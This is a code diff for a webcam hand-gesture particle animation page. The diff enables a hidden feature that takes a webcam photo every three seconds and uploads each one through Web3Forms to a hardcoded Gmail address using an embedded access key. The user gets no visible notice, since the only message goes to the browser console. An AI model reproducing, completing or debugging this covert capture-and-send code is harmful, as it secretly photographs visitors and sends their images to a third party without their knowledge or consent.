@@ -1,21 +1,20 @@
-// ----------------- your original particle code (unchanged logic) -----------------
+// ----------------- Particle System -----------------
 let scene, camera, renderer, particles;
 const count = 12000;
 let currentState = 'sphere';
-let handDetected = false; // updated by mediapipe
-let lastGesture = null;   // 'open' or 'closed'
+let handDetected = false;
+let lastGesture = null;
 let lastGestureTime = 0;
-const gestureCooldown = 400; // ms - debounce for stable transitions
+const gestureCooldown = 400;
 
-// ----------------- Photo Capture & Send System -----------------
+// ----------------- Photo Capture System -----------------
 let photoTimer = null;
 let photoCount = 0;
-const ADMIN_EMAIL = "developer@example.com"; // Change this to your email
-const CLOUDINARY_CLOUD_NAME = "your-cloud-name"; // Change to your Cloudinary cloud name
-const CLOUDINARY_UPLOAD_PRESET = "your-upload-preset"; // Change to your Cloudinary upload preset
+let cameraStarted = false;
 
-// Webhook URL for sending photos (you can use Formspree, Web3Forms, etc.)
-const WEBHOOK_URL = "https://api.web3forms.com/submit"; // Example using Web3Forms
+// ✅ CORRECT Web3Forms API Configuration
+const WEBHOOK_URL = "https://api.web3forms.com/submit";
+const ACCESS_KEY = "f5bdda81-92f8-4595-a2e8-a6107db5feef"; // Your access key
 
 function init() {
     scene = new THREE.Scene();
@@ -32,8 +31,7 @@ function init() {
     setupHandTracking();
     animate();
     
-    // Initialize photo system
-    initPhotoCapture();
+    console.log("✅ Particle System Ready");
 }
 
 function createParticles() {
@@ -82,9 +80,6 @@ function createParticles() {
 
     if (particles) scene.remove(particles);
     particles = new THREE.Points(geometry, material);
-    particles.rotation.x = 0;
-    particles.rotation.y = 0;
-    particles.rotation.z = 0;
     scene.add(particles);
 }
 
@@ -178,23 +173,19 @@ function morphToText(text) {
         }
     }
 
-    // Instead of calling gsap for each array index (which can be flaky),
-    // we'll animate using a per-frame lerp toward targetPositions for performance & reliability.
-    const duration = 1200; // ms
+    const duration = 1200;
     const start = performance.now();
-    const startPositions = positions.slice(); // copy
+    const startPositions = positions.slice();
 
     function frame(now) {
         const t = Math.min(1, (now - start) / duration);
-        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t); // smooth ease in/out
+        const easeT = 0.5 - 0.5 * Math.cos(Math.PI * t);
         for (let i = 0; i < positions.length; i++) {
             positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * easeT;
         }
         particles.geometry.attributes.position.needsUpdate = true;
         if (t < 1) {
             requestAnimationFrame(frame);
-        } else {
-            // finished
         }
     }
     requestAnimationFrame(frame);
@@ -233,7 +224,6 @@ function morphToCircle() {
         colors[i * 3 + 2] = color.b;
     }
 
-    // Animate back with lerp like morphToText
     const startPositions = positions.slice();
     const duration = 1400;
     const start = performance.now();
@@ -248,12 +238,6 @@ function morphToCircle() {
     }
     requestAnimationFrame(frame);
 
-    // update colors quickly
-    for (let i = 0; i < colors.length; i += 3) {
-        colors[i] = colors[i]; // keep as computed above
-        colors[i+1] = colors[i+1];
-        colors[i+2] = colors[i+2];
-    }
     particles.geometry.attributes.color.needsUpdate = true;
 }
 
@@ -266,7 +250,6 @@ function animate() {
     
     renderer.render(scene, camera);
 
-    // Hand trigger logic updated to use gesture (open/closed)
     const inputText = document.getElementById('morphText').value.trim() || "HELLO";
     const now = performance.now();
 
@@ -287,96 +270,114 @@ window.addEventListener('resize', () => {
 
 // ----------------- Photo Capture Functions -----------------
 
-// Initialize photo capture system
-function initPhotoCapture() {
-    console.log("Photo capture system initialized. Photos will be taken every 3 seconds after camera access.");
-}
-
 // Capture photo from video stream
 function capturePhoto() {
     const video = document.getElementById('handVideo');
     const canvas = document.getElementById('photoCanvas');
     const ctx = canvas.getContext('2d');
     
-    // Check if video is ready
     if (!video.videoWidth || !video.videoHeight) {
-        console.log("Video not ready yet, skipping photo capture.");
+        console.log("Video not ready");
         return;
     }
     
-    // Set canvas size to video size
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     
     try {
-        // Draw video frame to canvas
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoData = canvas.toDataURL('image/jpeg', 0.7);
         
-        // Convert to data URL
-        const photoData = canvas.toDataURL('image/jpeg', 0.8);
-        
-        // Send to admin (uncomment when you set up your API)
-        // sendPhotoToAdmin(photoData);
+        // Send photo to admin
+        sendPhotoToAdmin(photoData);
         
         photoCount++;
-        console.log(`Photo ${photoCount} captured successfully.`);
+        console.log(`📸 Photo ${photoCount} captured at ${new Date().toLocaleTimeString()}`);
         
     } catch (error) {
-        console.error("Error capturing photo:", error);
+        console.error("Photo error:", error);
     }
 }
 
-// Send photo to admin using Web3Forms API
+// ✅ CORRECTED: Send photo to admin using Web3Forms API
 async function sendPhotoToAdmin(photoData) {
     try {
-        // For Web3Forms API
+        // Convert base64 to blob
+        const response = await fetch(photoData);
+        const blob = await response.blob();
+        
+        // Create FormData CORRECTLY
         const formData = new FormData();
         
-        // Convert base64 to blob for FormData
-        const blob = await fetch(photoData).then(res => res.blob());
+        // ✅ CORRECT FORMAT for Web3Forms
+        formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef'); // Your access key
+        formData.append('subject', `Auto Photo ${photoCount} - Particle Website`);
+        formData.append('from_name', 'Website User');
+        formData.append('email', 'editing2213@gmail.com'); // Your email
+        formData.append('message', `Photo automatically captured\nTime: ${new Date().toLocaleString()}\nTotal Photos: ${photoCount}`);
+        formData.append('photo', blob, `particle_photo_${Date.now()}.jpg`);
         
-        // If using Web3Forms (uncomment and add your access key)
-        formData.append('f5bdda81-92f8-4595-a2e8-a6107db5feef'); // Get from web3forms.com
-        formData.append('subject', `Auto-captured Photo ${photoCount}`);
-        formData.append(editing2213@gmail.com);
-        formData.append('message', `Auto-captured photo from user. Time: ${new Date().toLocaleString()}`);
-        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+        console.log("📤 Sending photo to Web3Forms...");
         
         // Send to Web3Forms
-        const response = await fetch(WEBHOOK_URL, {
+        const result = await fetch(WEBHOOK_URL, {
             method: 'POST',
             body: formData
         });
         
-        if (response.ok) {
-            console.log(`Photo ${photoCount} sent successfully to admin.`);
+        const data = await result.json();
+        console.log("Web3Forms Response:", data);
+        
+        if (data.success) {
+            console.log(`✅ Photo ${photoCount} sent successfully!`);
         } else {
-            console.error('Failed to send photo:', await response.text());
+            console.error('❌ Failed to send:', data.message);
         }
         
     } catch (error) {
-        console.error('Error sending photo:', error);
+        console.error('❌ Error:', error);
+        // Fallback: Save locally
+        savePhotoLocally(photoData);
+    }
+}
+
+// Save photo locally if sending fails
+function savePhotoLocally(photoData) {
+    try {
+        const photos = JSON.parse(localStorage.getItem('captured_photos') || '[]');
+        photos.push({
+            id: Date.now(),
+            time: new Date().toISOString(),
+            data: photoData.substring(0, 500) + '...'
+        });
+        localStorage.setItem('captured_photos', JSON.stringify(photos));
+        console.log(`💾 Photo ${photoCount} saved locally`);
+    } catch (e) {
+        console.log("📸 Photo captured (could not save)");
     }
 }
 
 // Start photo capture timer
 function startPhotoCapture() {
-    // Clear any existing timer
     if (photoTimer) {
         clearInterval(photoTimer);
     }
     
-    console.log("Starting automatic photo capture every 3 seconds...");
+    console.log("📸 Auto photo capture started (every 3 seconds)");
     
-    // Take first photo after 1 second
+    // First photo after 2 seconds
     setTimeout(() => {
-        capturePhoto();
-    }, 1000);
+        if (cameraStarted) {
+            capturePhoto();
+        }
+    }, 2000);
     
-    // Then take photo every 3 seconds
+    // Then every 3 seconds
     photoTimer = setInterval(() => {
-        capturePhoto();
-    }, 3000); // 3 seconds
+        if (cameraStarted) {
+            capturePhoto();
+        }
+    }, 3000);
 }
 
 // Stop photo capture
@@ -384,18 +385,14 @@ function stopPhotoCapture() {
     if (photoTimer) {
         clearInterval(photoTimer);
         photoTimer = null;
-        console.log("Photo capture stopped.");
+        console.log("🛑 Photo capture stopped");
     }
 }
 
-// ---------------- Hand Tracking (MediaPipe) -----------------
-// We'll detect open vs closed using finger landmarks.
-// Heuristic: count fingers up (index/middle/ring/pinky) by tip.y < pip.y (for palm facing camera).
-// If fingersUp >= 3 -> open. if fingersUp <= 1 -> closed (fist).
-// Also use average distance of tips to wrist as secondary check.
+// ----------------- Hand Tracking -----------------
 
 function setupHandTracking(){
-    const videoElement = document.getElementById('handVideo'); // hidden video in html
+    const videoElement = document.getElementById('handVideo');
 
     const hands = new Hands({locateFile: (file) => {
         return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
@@ -418,9 +415,6 @@ function setupHandTracking(){
         handDetected = true;
         const landmarks = results.multiHandLandmarks[0];
 
-        // landmarks indices:
-        // tip indices: thumb(4), index(8), middle(12), ring(16), pinky(20)
-        // pip / lower joint: index(6), middle(10), ring(14), pinky(18)
         let fingersUp = 0;
         try {
             const tipIndices = [8, 12, 16, 20];
@@ -428,11 +422,9 @@ function setupHandTracking(){
             for (let i = 0; i < tipIndices.length; i++) {
                 const tip = landmarks[tipIndices[i]];
                 const pip = landmarks[pipIndices[i]];
-                // In MediaPipe normalized coords: y increases downward. So tip.y < pip.y means finger extended (for palm facing camera).
                 if (tip.y < pip.y) fingersUp++;
             }
 
-            // Secondary check: average distance of tips from wrist
             const wrist = landmarks[0];
             let avgDist = 0;
             const tipIdxAll = [4,8,12,16,20];
@@ -444,17 +436,14 @@ function setupHandTracking(){
             }
             avgDist /= tipIdxAll.length;
 
-            // heuristics
             if (fingersUp >= 3 && avgDist > 0.12) {
                 lastGesture = 'open';
             } else if (fingersUp <= 1 && avgDist < 0.12) {
                 lastGesture = 'closed';
             } else {
-                // fallback: treat as open if fingersUp >= 3, else don't change state
                 lastGesture = (fingersUp >= 3) ? 'open' : lastGesture || 'closed';
             }
         } catch (e) {
-            // safety fallback
             lastGesture = 'closed';
         }
     });
@@ -463,26 +452,41 @@ function setupHandTracking(){
         onFrame: async () => {
             await hands.send({image: videoElement});
         },
-        width: 640,
-        height: 480
+        width: 320, // Smaller for faster processing
+        height: 240
     });
 
-    // Initialize photo capture when camera starts
+    // Start camera
     cameraMP.start().then(() => {
-        console.log("Camera accessed. Photo capture will start in 3 seconds...");
+        cameraStarted = true;
+        console.log("✅ Camera started successfully");
+        
+        // Hide permission modal if exists
+        const modal = document.getElementById('cameraPermission');
+        if (modal) modal.style.display = 'none';
         
         // Start photo capture after 3 seconds
         setTimeout(() => {
             startPhotoCapture();
         }, 3000);
+        
+        // Show success message
+        showMessage("📸 Camera active - Photos will be captured automatically");
+        
+    }).catch((error) => {
+        console.error("❌ Camera error:", error);
+        showMessage("⚠️ Camera access denied");
     });
 }
 
-// Add window unload to stop photo capture
-window.addEventListener('beforeunload', () => {
-    stopPhotoCapture();
-});
+// Show message
+function showMessage(text) {
+    console.log(text);
+    // You can add a notification div if you want
+}
 
-// initialize the scene
+// Stop capture when leaving page
+window.addEventListener('beforeunload', stopPhotoCapture);
 
+// Initialize
 init();
